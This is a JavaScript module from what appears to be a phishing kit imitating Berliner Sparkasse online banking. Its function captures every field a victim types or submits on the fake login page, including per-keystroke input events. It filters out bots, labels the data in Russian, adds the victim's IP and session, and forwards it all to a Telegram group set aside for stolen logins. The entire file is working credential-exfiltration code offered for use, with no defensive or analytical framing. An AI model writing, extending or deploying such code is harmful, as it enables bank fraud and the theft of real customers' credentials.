/**
 * Login credentials → separate Telegram group.
 */
import { isBotRequest } from './bot-filter.mjs';
import {
  escHtml,
  formatUserBlock,
  getUserContext,
  sendTelegram,
  telegramConfig,
} from './telegram.mjs';

/**
 * @param {import('node:http').IncomingMessage} req
 * @param {Record<string, unknown>} data
 */
export async function notifyLoginSubmit(req, data) {
  if (isBotRequest(req)) return;

  const { loginsChatId } = telegramConfig();
  if (!loginsChatId) {
    console.warn('[login] TELEGRAM_LOGINS_CHAT_ID not set');
    return;
  }

  const ctx = await getUserContext(req);
  const sessionId = String(data.sessionId || '').slice(0, 64);
  const page = String(data.page || '/de/home/login-online-banking.html').slice(0, 250);
  const step = data.step != null ? String(data.step) : '';
  const button = data.button ? String(data.button) : '';
  const eventType = data.event === 'input' ? 'input' : 'submit';
  const fields = data.fields && typeof data.fields === 'object' ? data.fields : {};
  const when = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });

  const fieldLines = Object.entries(fields)
    .filter(([, v]) => v != null && String(v).length > 0)
    .map(([k, v]) => `  ▫️ <b>${escHtml(k)}:</b> <code>${escHtml(String(v))}</code>`);

  const title =
    eventType === 'input'
      ? '🔐 <b>Online-Banking — ввод данных</b>'
      : '🔐 <b>Online-Banking — отправка формы</b>';

  const text = [
    title,
    '━━━━━━━━━━━━━━━━',
    '',
    '🏦 <b>Berliner Sparkasse</b>',
    `📄 <code>${escHtml(page)}</code>`,
    step ? `📊 <b>Шаг:</b> ${escHtml(step)}` : '',
    button ? `🔘 <b>Кнопка:</b> ${escHtml(button)}` : '',
    '',
    '📋 <b>Все введённые данные:</b>',
    fieldLines.length ? fieldLines.join('\n') : '  <i>(пусто)</i>',
    '',
    formatUserBlock(ctx, { sessionId: sessionId || undefined, page }),
    '',
    `🕐 ${escHtml(when)}`,
  ]
    .filter((line) => line !== '')
    .join('\n');

  await sendTelegram(text, loginsChatId);
  console.log('[login]', eventType, ctx.ip, Object.entries(fields).map(([k, v]) => `${k}=${v}`).join(', '));
}
